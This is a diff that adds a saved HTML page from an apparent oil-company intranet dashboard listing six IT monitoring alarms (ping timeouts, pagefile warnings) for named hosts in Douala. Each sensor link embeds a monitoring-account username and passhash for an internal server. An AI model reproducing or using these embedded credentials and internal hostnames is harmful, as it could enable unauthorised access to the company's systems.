+													<a class="img-link img_page_link" href="http://dlatools.cm.perenco.com/sensor.htm?id=2914&amp;username=monitor&amp;passhash=2409805147" target="_blank" title="PRDR-LDN">					
+													PRDR-LDN
+						</a>
+					</td>
+					<td align="left" valign="top">
+													ldn - internet
+											</td>
+					<td style="font-size:0.9em;" align="right">
+						<div class="tips td_monitored_err_info" title="Request timed out (ICMP error # 11010)" style="float:right;width:16px;">
+						&nbsp;
+						</div>
+						<div style="float:right;">
+							&nbsp;						</div>
+						<div class="clear"></div>
+					</td>
+					<td style="font-size:0.8em;" align="center">
+						2013-07-27 22:30:40
+					</td>
+					<td align="center" valign="top">
+																		CM
+											</td>
+					<td class="tips" title="-" align="center" valign="top">
+						-					</td>
+					<td align="center">
+						<img src="Monitoring%20Notif.%20-%20IT%20Equipments%20-%20Perenco%20Intranet_fichiers/led_blue.png" class="tips img-vertical-middle" title="Pause this Sensor" onclick="display_monitoring_action_pause('0','LDN - INTERNET','1135097','2914');return false;" style="cursor:pointer;">
+						<img src="Monitoring%20Notif.%20-%20IT%20Equipments%20-%20Perenco%20Intranet_fichiers/gears_double_silver_16.png" class="tips img-vertical-middle" title="Take in Charge - OR - Fix all Incoming Notifications for this Equipment" onclick="display_monitoring_action('0','LDN - INTERNET','0','0');return false;" style="cursor:pointer;">
+						<img src="Monitoring%20Notif.%20-%20IT%20Equipments%20-%20Perenco%20Intranet_fichiers/gear_16.png" class="tips img-vertical-middle" title="Take in Charge - OR - Fix this Incoming Notification" onclick="display_monitoring_action('0','LDN - INTERNET','1135097','2914');return false;" style="cursor:pointer;">						
+					</td>
+				</tr>
+				
+											<tr class="odd line_color_0 tr_survol ">
+					<td class="tips td_monitored_err_5" style="border-left:3px solid blue;" title="Down  - previously: Non Event" align="center">
+						&nbsp;						
+					</td>
+					<td align="center">
+						<img src="Monitoring%20Notif.%20-%20IT%20Equipments%20-%20Perenco%20Intranet_fichiers/flip_flap_redgreen_16.png" title="FLIP / FLAP">						
+					</td>
+					<td align="left">
+													<a class="img-link img_page_link" href="http://dlatools.cm.perenco.com/sensor.htm?id=2380&amp;username=monitor&amp;passhash=2409805147" target="_blank" title="Latency">					
+													Latency
+						</a>
+					</td>
+					<td align="left" valign="top">
+													<img src="Monitoring%20Notif.%20-%20IT%20Equipments%20-%20Perenco%20Intranet_fichiers/popup_blue_16.gif" class="img-vertical-middle"><a href="#" class="tip general_link" title="Open in a POP-UP window" onclick="open_popup_eqp_card(539);return false;">cm-dla-bas-s</a>
+											</td>
+					<td style="font-size:0.9em;" align="right">
+						<div class="tips td_monitored_err_info" title="Request timed out (ICMP error # 11010)" style="float:right;width:16px;">
+						&nbsp;
+						</div>
+						<div style="float:right;">
+							&nbsp;						</div>
+						<div class="clear"></div>
+					</td>
+					<td style="font-size:0.8em;" align="center">
+						2013-06-21 18:30:45
+					</td>
+					<td align="center" valign="top">
+																		CM
+											</td>
+					<td class="tips" title="Douala" align="center" valign="top">
+						DLA					</td>
+					<td align="center">
+						<img src="Monitoring%20Notif.%20-%20IT%20Equipments%20-%20Perenco%20Intranet_fichiers/led_blue.png" class="tips img-vertical-middle" title="Pause this Sensor" onclick="display_monitoring_action_pause('539','cm-dla-bas-s','1113079','2380');return false;" style="cursor:pointer;">
+						<img src="Monitoring%20Notif.%20-%20IT%20Equipments%20-%20Perenco%20Intranet_fichiers/gears_double_silver_16.png" class="tips img-vertical-middle" title="Take in Charge - OR - Fix all Incoming Notifications for this Equipment" onclick="display_monitoring_action('539','cm-dla-bas-s','0','0');return false;" style="cursor:pointer;">
+						<img src="Monitoring%20Notif.%20-%20IT%20Equipments%20-%20Perenco%20Intranet_fichiers/gear_16.png" class="tips img-vertical-middle" title="Take in Charge - OR - Fix this Incoming Notification" onclick="display_monitoring_action('539','cm-dla-bas-s','1113079','2380');return false;" style="cursor:pointer;">						
+					</td>
+				</tr>
+				
+											<tr class="even line_color_0 tr_survol ">
+					<td class="tips td_monitored_err_4" title="Warning " align="center">
+						&nbsp;						
+					</td>
+					<td align="center">
+						<img src="Monitoring%20Notif.%20-%20IT%20Equipments%20-%20Perenco%20Intranet_fichiers/flip_flap_redgreen_16.png" title="FLIP / FLAP">						
+					</td>
+					<td align="left">
+													<a class="img-link img_page_link" href="http://dlatools.cm.perenco.com/sensor.htm?id=2087&amp;username=monitor&amp;passhash=2409805147" target="_blank" title="Pagefile">					
+													Pagefile
+						</a>
+					</td>
+					<td align="left" valign="top">
+													sap pcm6
+											</td>
+					<td style="font-size:0.9em;" align="right">
+						<div class="tips td_monitored_err_info" title="67 % (Total) is above the warning limit of 60 %" style="float:right;width:16px;">
+						&nbsp;
+						</div>
+						<div style="float:right;">
+							67 %						</div>
+						<div class="clear"></div>
+					</td>
+					<td style="font-size:0.8em;" align="center">
+						2013-08-01 11:50:48
+					</td>
+					<td align="center" valign="top">
+																		CM
+											</td>
+					<td class="tips" title="-" align="center" valign="top">
+						-					</td>
+					<td align="center">
+						<img src="Monitoring%20Notif.%20-%20IT%20Equipments%20-%20Perenco%20Intranet_fichiers/led_blue.png" class="tips img-vertical-middle" title="Pause this Sensor" onclick="display_monitoring_action_pause('0','SAP PCM6','1137396','2087');return false;" style="cursor:pointer;">
+						<img src="Monitoring%20Notif.%20-%20IT%20Equipments%20-%20Perenco%20Intranet_fichiers/gears_double_silver_16.png" class="tips img-vertical-middle" title="Take in Charge - OR - Fix all Incoming Notifications for this Equipment" onclick="display_monitoring_action('0','SAP PCM6','0','0');return false;" style="cursor:pointer;">
+						<img src="Monitoring%20Notif.%20-%20IT%20Equipments%20-%20Perenco%20Intranet_fichiers/gear_16.png" class="tips img-vertical-middle" title="Take in Charge - OR - Fix this Incoming Notification" onclick="display_monitoring_action('0','SAP PCM6','1137396','2087');return false;" style="cursor:pointer;">						
+					</td>
+				</tr>
+				
+											<tr class="odd line_color_0 tr_survol ">
+					<td class="tips td_monitored_err_4" title="Warning " align="center">
+						&nbsp;						
+					</td>
+					<td align="center">
+						<img src="Monitoring%20Notif.%20-%20IT%20Equipments%20-%20Perenco%20Intranet_fichiers/flip_flap_redgreen_16.png" title="FLIP / FLAP">						
+					</td>
+					<td align="left">
+													<a class="img-link img_page_link" href="http://dlatools.cm.perenco.com/sensor.htm?id=2695&amp;username=monitor&amp;passhash=2409805147" target="_blank" title="Pagefile">					
+													Pagefile
+						</a>
+					</td>
+					<td align="left" valign="top">
+													<img src="Monitoring%20Notif.%20-%20IT%20Equipments%20-%20Perenco%20Intranet_fichiers/popup_blue_16.gif" class="img-vertical-middle"><a href="#" class="tip general_link" title="Open in a POP-UP window" onclick="open_popup_eqp_card(765);return false;">dladlta01</a>
+											</td>
+					<td style="font-size:0.9em;" align="right">
+						<div class="tips td_monitored_err_info" title="63 % (Total) is above the warning limit of 60 %" style="float:right;width:16px;">
+						&nbsp;
+						</div>
+						<div style="float:right;">
+							63 %						</div>
+						<div class="clear"></div>
+					</td>
+					<td style="font-size:0.8em;" align="center">
+						2013-08-01 11:30:42
+					</td>
+					<td align="center" valign="top">
+																		CM
+											</td>
+					<td class="tips" title="Douala" align="center" valign="top">
+						DLA					</td>
+					<td align="center">
+						<img src="Monitoring%20Notif.%20-%20IT%20Equipments%20-%20Perenco%20Intranet_fichiers/led_blue.png" class="tips img-vertical-middle" title="Pause this Sensor" onclick="display_monitoring_action_pause('765','DLADLTA01','1137391','2695');return false;" style="cursor:pointer;">
+						<img src="Monitoring%20Notif.%20-%20IT%20Equipments%20-%20Perenco%20Intranet_fichiers/gears_double_silver_16.png" class="tips img-vertical-middle" title="Take in Charge - OR - Fix all Incoming Notifications for this Equipment" onclick="display_monitoring_action('765','DLADLTA01','0','0');return false;" style="cursor:pointer;">
+						<img src="Monitoring%20Notif.%20-%20IT%20Equipments%20-%20Perenco%20Intranet_fichiers/gear_16.png" class="tips img-vertical-middle" title="Take in Charge - OR - Fix this Incoming Notification" onclick="display_monitoring_action('765','DLADLTA01','1137391','2695');return false;" style="cursor:pointer;">						
+					</td>
+				</tr>
+				
+											<tr class="even line_color_0 tr_survol ">
+					<td class="tips td_monitored_err_4" style="border-left:3px solid blue;" title="Warning  - previously: Non Event" align="center">
+						&nbsp;						
+					</td>
+					<td align="center">
+						<img src="Monitoring%20Notif.%20-%20IT%20Equipments%20-%20Perenco%20Intranet_fichiers/flip_flap_redgreen_16.png" title="FLIP / FLAP">						
+					</td>
+					<td align="left">
+													<a class="img-link img_page_link" href="http://dlatools.cm.perenco.com/sensor.htm?id=2280&amp;username=monitor&amp;passhash=2409805147" target="_blank" title="BVF4">					
+													BVF4
+						</a>
+					</td>
+					<td align="left" valign="top">
+													bvf4 - bap secteur 1
+											</td>
+					<td style="font-size:0.9em;" align="right">
+						<div class="tips td_monitored_err_info" title="Request timed out (ICMP error # 11010)" style="float:right;width:16px;">
+						&nbsp;
+						</div>
+						<div style="float:right;">
+							&nbsp;						</div>
+						<div class="clear"></div>
+					</td>
+					<td style="font-size:0.8em;" align="center">
+						2013-07-18 04:50:47
+					</td>
+					<td align="center" valign="top">
+																		CM
+											</td>
+					<td class="tips" title="-" align="center" valign="top">
+						-					</td>
+					<td align="center">
+						<img src="Monitoring%20Notif.%20-%20IT%20Equipments%20-%20Perenco%20Intranet_fichiers/led_blue.png" class="tips img-vertical-middle" title="Pause this Sensor" onclick="display_monitoring_action_pause('0','BVF4 - BAP Secteur 1','1130081','2280');return false;" style="cursor:pointer;">
+						<img src="Monitoring%20Notif.%20-%20IT%20Equipments%20-%20Perenco%20Intranet_fichiers/gears_double_silver_16.png" class="tips img-vertical-middle" title="Take in Charge - OR - Fix all Incoming Notifications for this Equipment" onclick="display_monitoring_action('0','BVF4 - BAP Secteur 1','0','0');return false;" style="cursor:pointer;">
+						<img src="Monitoring%20Notif.%20-%20IT%20Equipments%20-%20Perenco%20Intranet_fichiers/gear_16.png" class="tips img-vertical-middle" title="Take in Charge - OR - Fix this Incoming Notification" onclick="display_monitoring_action('0','BVF4 - BAP Secteur 1','1130081','2280');return false;" style="cursor:pointer;">						
+					</td>
+				</tr>
+				
+									</tbody></table>
+		
+
+			<div class="eqp_pagination_nbr_res" id="div_nbr_results" style="float:left;" align="left">
+				6 alarms found<br>
+				Page 1/1
+			</div>
+							&nbsp;
+						<div style="clear:both;"></div>
+	
+		</div>
+		
+
+
+</div>
+
+		</div>
+	</div>
+</div>
+
+
+<script type="text/javascript">
+<!--
+/**
+ * Actions exécutées au chargement de la page.
+ */
+
+window.addEvent( 'domready', function()
+{
+
+	call_display_monitoring();
+
+});
+
+
+//-->
+</script>
+
+																							</div>
+				</div> <!-- end #tpl_inner_body -->
+				
+			</div> <!-- end #tpl_wrapper_body -->			
+			<div style="clear: both">&nbsp;</div>
+			
+		</div> <!-- end #tpl_main_body -->
+		
+	</div> <!-- end #tpl_wrapper_page -->
+	<div style="clear: both">&nbsp;</div>	
+
+<div id="__yael_once"></div></body></html>
